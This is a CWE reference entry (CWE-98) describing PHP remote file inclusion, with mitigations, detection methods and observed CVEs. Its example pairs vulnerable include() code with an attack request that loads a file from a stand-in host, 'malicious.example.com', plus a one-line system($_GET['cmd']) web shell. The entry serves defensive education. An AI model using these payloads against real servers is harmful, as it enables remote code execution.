{"ID":"98","Name":"Improper Control of Filename for Include/Require Statement in PHP Program ('PHP Remote File Inclusion')","Abstraction":"Variant","Structure":"Simple","Status":"Draft","Description":"The PHP application receives input from an upstream component, but it does not restrict or incorrectly restricts the input before its usage in \"require,\" \"include,\" or similar functions.","ExtendedDescription":"In certain versions and configurations of PHP, this can allow an attacker to specify a URL to a remote location from which the product will obtain the code to execute. In other cases in association with path traversal, the attacker can specify a local file that may contain executable statements that can be parsed by PHP.","LikelihoodOfExploit":"High","RelatedWeaknesses":[{"Nature":"ChildOf","CweID":"706","ViewID":"1000"},{"Nature":"ChildOf","CweID":"829","ViewID":"1000","Ordinal":"Primary"},{"Nature":"CanPrecede","CweID":"94","ViewID":"1000"},{"Nature":"CanAlsoBe","CweID":"426","ViewID":"1000"}],"ApplicablePlatforms":[{"Type":"Language","Name":"PHP","Prevalence":"Often"}],"AlternateTerms":[{"Term":"Remote file include"},{"Term":"RFI","Description":"The Remote File Inclusion (RFI) acronym is often used by vulnerability researchers."},{"Term":"Local file inclusion","Description":"This term is frequently used in cases in which remote download is disabled, or when the first part of the filename is not under the attacker's control, which forces use of relative path traversal (CWE-23) attack techniques to access files that may contain previously-injected PHP code, such as web access logs."}],"ModesOfIntroduction":[{"Phase":"Implementation","Note":"REALIZATION: This weakness is caused during implementation of an architectural security tactic."}],"CommonConsequences":[{"Scope":["Integrity","Confidentiality","Availability"],"Impact":["Execute Unauthorized Code or Commands"],"Note":"The attacker may be able to specify arbitrary code to be executed from a remote location. Alternatively, it may be possible to use normal program behavior to insert php code into files on the local machine which can then be included and force the code to execute since php ignores everything in the file except for the content between php specifiers."}],"DetectionMethods":[{"Method":"Manual Analysis","Description":"Manual white-box analysis can be very effective for finding this issue, since there is typically a relatively small number of include or require statements in each program.","Effectiveness":"High"},{"Method":"Automated Static Analysis","Description":"\n\nThe external control or influence of filenames can often be detected using automated static analysis that models data flow within the product.\n\n\nAutomated static analysis might not be able to recognize when proper input validation is being performed, leading to false positives - i.e., warnings that do not have any security consequences or require any code changes. If the program uses a customized input validation library, then some tools may allow the analyst to create custom signatures to detect usage of those routines.\n"}],"PotentialMitigations":[{"MitigationID":"MIT-4","Phase":["Architecture and Design"],"Strategy":"Libraries or Frameworks","Description":"Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid."},{"MitigationID":"MIT-21.1","Phase":["Architecture and Design"],"Strategy":"Enforcement by Conversion","Description":"\n\nWhen the set of acceptable objects, such as filenames or URLs, is limited or known, create a mapping from a set of fixed input values (such as numeric IDs) to the actual filenames or URLs, and reject all other inputs.\n\n\nFor example, ID 1 could map to \"inbox.txt\" and ID 2 could map to \"profile.txt\". Features such as the ESAPI AccessReferenceMap [REF-185] provide this capability.\n"},{"MitigationID":"MIT-15","Phase":["Architecture and Design"],"Description":"For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoid CWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server."},{"MitigationID":"MIT-22","Phase":["Architecture and Design","Operation"],"Strategy":"Sandbox or Jail","Description":"\n\nRun the code in a \"jail\" or similar sandbox environment that enforces strict boundaries between the process and the operating system. This may effectively restrict which files can be accessed in a particular directory or which commands can be executed by the software.\n\n\nOS-level examples include the Unix chroot jail, AppArmor, and SELinux. In general, managed code may provide some protection. For example, java.io.FilePermission in the Java SecurityManager allows the software to specify restrictions on file operations.\n\n\nThis may not be a feasible solution, and it only limits the impact to the operating system; the rest of the application may still be subject to compromise.\n\n\nBe careful to avoid CWE-243 and other weaknesses related to jails.\n","Effectiveness":"Limited","EffectivenessNotes":"The effectiveness of this mitigation depends on the prevention capabilities of the specific sandbox or jail being used and might only help to reduce the scope of an attack, such as restricting the attacker to certain system calls or limiting the portion of the file system that can be accessed."},{"MitigationID":"MIT-17","Phase":["Architecture and Design","Operation"],"Strategy":"Environment Hardening","Description":"Run your code using the lowest privileges that are required to accomplish the necessary tasks [REF-76]. If possible, create isolated accounts with limited privileges that are only used for a single task. That way, a successful attack will not immediately give the attacker access to the rest of the software or its environment. For example, database applications rarely need to run as the database administrator, especially in day-to-day operations."},{"MitigationID":"MIT-5.1","Phase":["Implementation"],"Strategy":"Input Validation","Description":"\n\nAssume all input is malicious. Use an \"accept known good\" input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.\n\n\nWhen performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, \"boat\" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as \"red\" or \"blue.\"\n\n\nDo not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.\n\n\nWhen validating filenames, use stringent lists that limit the character set to be used. If feasible, only allow a single \".\" character in the filename to avoid weaknesses such as CWE-23, and exclude directory separators such as \"/\" to avoid CWE-36. Use a list of allowable file extensions, which will help to avoid CWE-434.\n\n\nDo not rely exclusively on a filtering mechanism that removes potentially dangerous characters. This is equivalent to a denylist, which may be incomplete (CWE-184). For example, filtering \"/\" is insufficient protection if the filesystem also supports the use of \"\\\" as a directory separator. Another possible error could occur when the filtering is applied in a way that still produces dangerous data (CWE-182). For example, if \"../\" sequences are removed from the \".../...//\" string in a sequential fashion, two instances of \"../\" would be removed from the original string, but the remaining characters would still form the \"../\" string.\n","Effectiveness":"High"},{"MitigationID":"MIT-34","Phase":["Architecture and Design","Operation"],"Strategy":"Attack Surface Reduction","Description":"\n\nStore library, include, and utility files outside of the web document root, if possible. Otherwise, store them in a separate directory and use the web server's access control capabilities to prevent attackers from directly requesting them. One common practice is to define a fixed constant in each calling program, then check for the existence of the constant in the library/include file; if the constant does not exist, then the file was directly requested, and it can exit immediately.\n\n\nThis significantly reduces the chance of an attacker being able to bypass any protection mechanisms that are in the base program but not in the include files. It will also reduce the attack surface.\n"},{"MitigationID":"MIT-6","Phase":["Architecture and Design","Implementation"],"Strategy":"Attack Surface Reduction","Description":"\n\nUnderstand all the potential areas where untrusted inputs can enter your software: parameters or arguments, cookies, anything read from the network, environment variables, reverse DNS lookups, query results, request headers, URL components, e-mail, files, filenames, databases, and any external systems that provide data to the application. Remember that such inputs may be obtained indirectly through API calls.\n\n\nMany file inclusion problems occur because the programmer assumed that certain inputs could not be modified, especially for cookies and URL components.\n"},{"MitigationID":"MIT-29","Phase":["Operation"],"Strategy":"Firewall","Description":"Use an application firewall that can detect attacks against this weakness. It can be beneficial in cases in which the code cannot be fixed (because it is controlled by a third party), as an emergency prevention measure while more comprehensive software assurance measures are applied, or to provide defense in depth.","Effectiveness":"Moderate","EffectivenessNotes":"An application firewall might not cover all possible input vectors. In addition, attack techniques might be available to bypass the protection mechanism, such as using malformed inputs that can still be processed by the component that receives those inputs. Depending on functionality, an application firewall might inadvertently reject or modify legitimate requests. Finally, some manual effort may be required for customization."},{"Phase":["Operation","Implementation"],"Strategy":"Environment Hardening","Description":"Develop and run your code in the most recent versions of PHP available, preferably PHP 6 or later. Many of the highly risky features in earlier PHP interpreters have been removed, restricted, or disabled by default."},{"MitigationID":"MIT-16","Phase":["Operation","Implementation"],"Strategy":"Environment Hardening","Description":"\n\nWhen using PHP, configure the application so that it does not use register_globals. During implementation, develop the application so that it does not rely on this feature, but be wary of implementing a register_globals emulation that is subject to weaknesses such as CWE-95, CWE-621, and similar issues.\n\n\nOften, programmers do not protect direct access to files intended only to be included by core programs. These include files may assume that critical variables have already been initialized by the calling program. As a result, the use of register_globals combined with the ability to directly access the include file may allow attackers to conduct file inclusion attacks. This remains an extremely common pattern as of 2009.\n"},{"Phase":["Operation"],"Strategy":"Environment Hardening","Description":"Set allow_url_fopen to false, which limits the ability to include files from remote locations.","Effectiveness":"High","EffectivenessNotes":"Be aware that some versions of PHP will still accept ftp:// and other URI schemes. In addition, this setting does not protect the code from path traversal attacks (CWE-22), which are frequently successful against the same vulnerable code that allows remote file inclusion."}],"DemonstrativeExamples":[{"Entries":[{"IntroText":"The following code, victim.php, attempts to include a function contained in a separate PHP page on the server. It builds the path to the file by using the supplied 'module_name' parameter and appending the string '/function.php' to it."},{"Nature":"Bad","Language":"PHP","ExampleCode":"```\n\t$dir = $_GET['module_name'];\n\tinclude($dir . \"/function.php\");\n```"},{"BodyText":"The problem with the above code is that the value of $dir is not restricted in any way, and a malicious user could manipulate the 'module_name' parameter to force inclusion of an unanticipated file. For example, an attacker could request the above PHP page (example.php) with a 'module_name' of \"http://malicious.example.com\" by using the following request string:"},{"Nature":"Attack","ExampleCode":"```\n\tvictim.php?module_name=http://malicious.example.com\n```"},{"BodyText":"Upon receiving this request, the code would set 'module_name' to the value \"http://malicious.example.com\" and would attempt to include http://malicious.example.com/function.php, along with any malicious code it contains."},{"BodyText":"For the sake of this example, assume that the malicious version of function.php looks like the following:"},{"Nature":"Bad","ExampleCode":"```\n\tsystem($_GET['cmd']);\n```"},{"BodyText":"An attacker could now go a step further in our example and provide a request string as follows:"},{"Nature":"Attack","ExampleCode":"```\n\tvictim.php?module_name=http://malicious.example.com\u0026cmd=/bin/ls%20-l\n```"},{"BodyText":"The code will attempt to include the malicious function.php file from the remote site. In turn, this file executes the command specified in the 'cmd' parameter from the query string. The end result is an attempt by tvictim.php to execute the potentially malicious command, in this case:"},{"Nature":"Attack","ExampleCode":"```\n\t/bin/ls -l\n```"},{"BodyText":"Note that the above PHP example can be mitigated by setting allow_url_fopen to false, although this will not fully protect the code. See potential mitigations."}]}],"ObservedExamples":[{"Reference":"CVE-2004-0285","Description":"Modification of assumed-immutable configuration variable in include file allows file inclusion via direct request.","Link":"https://www.cve.org/CVERecord?id=CVE-2004-0285"},{"Reference":"CVE-2004-0030","Description":"Modification of assumed-immutable configuration variable in include file allows file inclusion via direct request.","Link":"https://www.cve.org/CVERecord?id=CVE-2004-0030"},{"Reference":"CVE-2004-0068","Description":"Modification of assumed-immutable configuration variable in include file allows file inclusion via direct request.","Link":"https://www.cve.org/CVERecord?id=CVE-2004-0068"},{"Reference":"CVE-2005-2157","Description":"Modification of assumed-immutable configuration variable in include file allows file inclusion via direct request.","Link":"https://www.cve.org/CVERecord?id=CVE-2005-2157"},{"Reference":"CVE-2005-2162","Description":"Modification of assumed-immutable configuration variable in include file allows file inclusion via direct request.","Link":"https://www.cve.org/CVERecord?id=CVE-2005-2162"},{"Reference":"CVE-2005-2198","Description":"Modification of assumed-immutable configuration variable in include file allows file inclusion via direct request.","Link":"https://www.cve.org/CVERecord?id=CVE-2005-2198"},{"Reference":"CVE-2004-0128","Description":"Modification of assumed-immutable variable in configuration script leads to file inclusion.","Link":"https://www.cve.org/CVERecord?id=CVE-2004-0128"},{"Reference":"CVE-2005-1864","Description":"PHP file inclusion.","Link":"https://www.cve.org/CVERecord?id=CVE-2005-1864"},{"Reference":"CVE-2005-1869","Description":"PHP file inclusion.","Link":"https://www.cve.org/CVERecord?id=CVE-2005-1869"},{"Reference":"CVE-2005-1870","Description":"PHP file inclusion.","Link":"https://www.cve.org/CVERecord?id=CVE-2005-1870"},{"Reference":"CVE-2005-2154","Description":"PHP local file inclusion.","Link":"https://www.cve.org/CVERecord?id=CVE-2005-2154"},{"Reference":"CVE-2002-1704","Description":"PHP remote file include.","Link":"https://www.cve.org/CVERecord?id=CVE-2002-1704"},{"Reference":"CVE-2002-1707","Description":"PHP remote file include.","Link":"https://www.cve.org/CVERecord?id=CVE-2002-1707"},{"Reference":"CVE-2005-1964","Description":"PHP remote file include.","Link":"https://www.cve.org/CVERecord?id=CVE-2005-1964"},{"Reference":"CVE-2005-1681","Description":"PHP remote file include.","Link":"https://www.cve.org/CVERecord?id=CVE-2005-1681"},{"Reference":"CVE-2005-2086","Description":"PHP remote file include.","Link":"https://www.cve.org/CVERecord?id=CVE-2005-2086"},{"Reference":"CVE-2004-0127","Description":"Directory traversal vulnerability in PHP include statement.","Link":"https://www.cve.org/CVERecord?id=CVE-2004-0127"},{"Reference":"CVE-2005-1971","Description":"Directory traversal vulnerability in PHP include statement.","Link":"https://www.cve.org/CVERecord?id=CVE-2005-1971"},{"Reference":"CVE-2005-3335","Description":"PHP file inclusion issue, both remote and local; local include uses \"..\" and \"%00\" characters as a manipulation, but many remote file inclusion issues probably have this vector.","Link":"https://www.cve.org/CVERecord?id=CVE-2005-3335"},{"Reference":"CVE-2009-1936","Description":"chain: library file sends a redirect if it is directly requested but continues to execute, allowing remote file inclusion and path traversal.","Link":"https://www.cve.org/CVERecord?id=CVE-2009-1936"}],"AffectedResources":["File or Directory"],"TaxonomyMappings":[{"TaxonomyName":"PLOVER","EntryName":"PHP File Include"},{"TaxonomyName":"OWASP Top Ten 2007","EntryID":"A3","EntryName":"Malicious File Execution","MappingFit":"CWE More Specific"},{"TaxonomyName":"WASC","EntryID":"5","EntryName":"Remote File Inclusion"}],"RelatedAttackPatterns":["193"],"MappingNotes":{"Usage":"Allowed","Rationale":"This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.","Comments":"Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.","Reasons":["Acceptable-Use"]},"References":[{"ExternalReferenceID":"REF-185","Authors":["OWASP"],"Title":"Testing for Path Traversal (OWASP-AZ-001)","URL":"http://www.owasp.org/index.php/Testing_for_Path_Traversal_(OWASP-AZ-001)"},{"ExternalReferenceID":"REF-76","Authors":["Sean Barnum","Michael Gegick"],"Title":"Least Privilege","PublicationYear":"2005","PublicationMonth":"09","PublicationDay":"14","URL":"https://web.archive.org/web/20211209014121/https://www.cisa.gov/uscert/bsi/articles/knowledge/principles/least-privilege","URLDate":"2023-04-07"},{"ExternalReferenceID":"REF-951","Authors":["Shaun Clowes"],"Title":"A Study in Scarlet","URL":"https://www.cgisecurity.com/lib/studyinscarlet.txt","URLDate":"2023-04-07"},{"ExternalReferenceID":"REF-952","Authors":["Stefan Esser"],"Title":"Suhosin","URL":"http://www.hardened-php.net/suhosin/"},{"ExternalReferenceID":"REF-953","Authors":["Johannes Ullrich"],"Title":"Top 25 Series - Rank 13 - PHP File Inclusion","PublicationYear":"2010","PublicationMonth":"03","PublicationDay":"11","Publisher":"SANS Software Security Institute","URL":"https://www.sans.org/blog/top-25-series-rank-13-php-file-inclusion/","URLDate":"2023-04-07"}],"Notes":[{"Type":"Relationship","Note":"\n\nThis is frequently a functional consequence of other weaknesses. It is usually multi-factor with other factors (e.g. MAID), although not all inclusion bugs involve assumed-immutable data. Direct request weaknesses frequently play a role.\n\n\nCan overlap directory traversal in local inclusion problems.\n"}],"ContentHistory":[{"Type":"Submission","SubmissionName":"PLOVER","SubmissionDate":"2006-07-19"},{"Type":"Modification","ModificationName":"Eric Dalci","ModificationOrganization":"Cigital","ModificationDate":"2008-07-01","ModificationComment":"updated Time_of_Introduction"},{"Type":"Modification","ModificationName":"CWE Content Team","ModificationOrganization":"MITRE","ModificationDate":"2008-09-08","ModificationComment":"updated Relationships, Relationship_Notes, Research_Gaps, Taxonomy_Mappings"},{"Type":"Modification","ModificationName":"CWE Content Team","ModificationOrganization":"MITRE","ModificationDate":"2009-01-12","ModificationComment":"updated Relationships"},{"Type":"Modification","ModificationName":"CWE Content Team","ModificationOrganization":"MITRE","ModificationDate":"2009-03-10","ModificationComment":"updated Relationships"},{"Type":"Modification","ModificationName":"CWE Content Team","ModificationOrganization":"MITRE","ModificationDate":"2009-05-27","ModificationComment":"updated Description, Name"},{"Type":"Modification","ModificationName":"CWE Content Team","ModificationOrganization":"MITRE","ModificationDate":"2009-12-28","ModificationComment":"updated Alternate_Terms, Applicable_Platforms, Demonstrative_Examples, Likelihood_of_Exploit, Potential_Mitigations, Time_of_Introduction"},{"Type":"Modification","ModificationName":"CWE Content Team","ModificationOrganization":"MITRE","ModificationDate":"2010-02-16","ModificationComment":"converted from Compound_Element to Weakness"},{"Type":"Modification","ModificationName":"CWE Content Team","ModificationOrganization":"MITRE","ModificationDate":"2010-02-16","ModificationComment":"updated Alternate_Terms, Common_Consequences, Detection_Factors, Potential_Mitigations, References, Related_Attack_Patterns, Relationships, Taxonomy_Mappings, Type"},{"Type":"Modification","ModificationName":"CWE Content Team","ModificationOrganization":"MITRE","ModificationDate":"2010-06-21","ModificationComment":"updated Potential_Mitigations, References"},{"Type":"Modification","ModificationName":"CWE Content Team","ModificationOrganization":"MITRE","ModificationDate":"2010-09-27","ModificationComment":"updated Potential_Mitigations"},{"Type":"Modification","ModificationName":"CWE Content Team","ModificationOrganization":"MITRE","ModificationDate":"2010-12-13","ModificationComment":"updated Potential_Mitigations"},{"Type":"Modification","ModificationName":"CWE Content Team","ModificationOrganization":"MITRE","ModificationDate":"2011-06-27","ModificationComment":"updated Relationships"},{"Type":"Modification","ModificationName":"CWE Content Team","ModificationOrganization":"MITRE","ModificationDate":"2012-10-30","ModificationComment":"updated Potential_Mitigations, References"},{"Type":"Modification","ModificationName":"CWE Content Team","ModificationOrganization":"MITRE","ModificationDate":"2013-02-21","ModificationComment":"updated Alternate_Terms, Name, Observed_Examples"},{"Type":"Modification","ModificationName":"CWE Content Team","ModificationOrganization":"MITRE","ModificationDate":"2017-01-19","ModificationComment":"updated Relationships"},{"Type":"Modification","ModificationName":"CWE Content Team","ModificationOrganization":"MITRE","ModificationDate":"2017-11-08","ModificationComment":"updated Affected_Resources, Demonstrative_Examples, Likelihood_of_Exploit, Modes_of_Introduction, References, Relationships"},{"Type":"Modification","ModificationName":"CWE Content Team","ModificationOrganization":"MITRE","ModificationDate":"2019-06-20","ModificationComment":"updated Type"},{"Type":"Modification","ModificationName":"CWE Content Team","ModificationOrganization":"MITRE","ModificationDate":"2020-02-24","ModificationComment":"updated Potential_Mitigations, Relationships"},{"Type":"Modification","ModificationName":"CWE Content Team","ModificationOrganization":"MITRE","ModificationDate":"2020-06-25","ModificationComment":"updated Potential_Mitigations"},{"Type":"Modification","ModificationName":"CWE Content Team","ModificationOrganization":"MITRE","ModificationDate":"2021-03-15","ModificationComment":"updated Potential_Mitigations"},{"Type":"Modification","ModificationName":"CWE Content Team","ModificationOrganization":"MITRE","ModificationDate":"2021-10-28","ModificationComment":"updated Relationships"},{"Type":"Modification","ModificationName":"CWE Content Team","ModificationOrganization":"MITRE","ModificationDate":"2022-04-28","ModificationComment":"updated Research_Gaps"},{"Type":"Modification","ModificationName":"CWE Content Team","ModificationOrganization":"MITRE","ModificationDate":"2022-10-13","ModificationComment":"updated References"},{"Type":"Modification","ModificationName":"CWE Content Team","ModificationOrganization":"MITRE","ModificationDate":"2023-01-31","ModificationComment":"updated Description, Detection_Factors"},{"Type":"Modification","ModificationName":"CWE Content Team","ModificationOrganization":"MITRE","ModificationDate":"2023-04-27","ModificationComment":"updated References, Relationships, Time_of_Introduction"},{"Type":"Modification","ModificationName":"CWE Content Team","ModificationOrganization":"MITRE","ModificationDate":"2023-06-29","ModificationComment":"updated Mapping_Notes"},{"Type":"Rename","PreviousEntryName":"PHP File Inclusion","Date":"2008-04-11"},{"Type":"Rename","PreviousEntryName":"Insufficient Control of Filename for Include/Require Statement in PHP Program (aka 'PHP File Inclusion')","Date":"2009-05-27"},{"Type":"Rename","PreviousEntryName":"Improper Control of Filename for Include/Require Statement in PHP Program ('PHP File Inclusion')","Date":"2013-02-21"}]}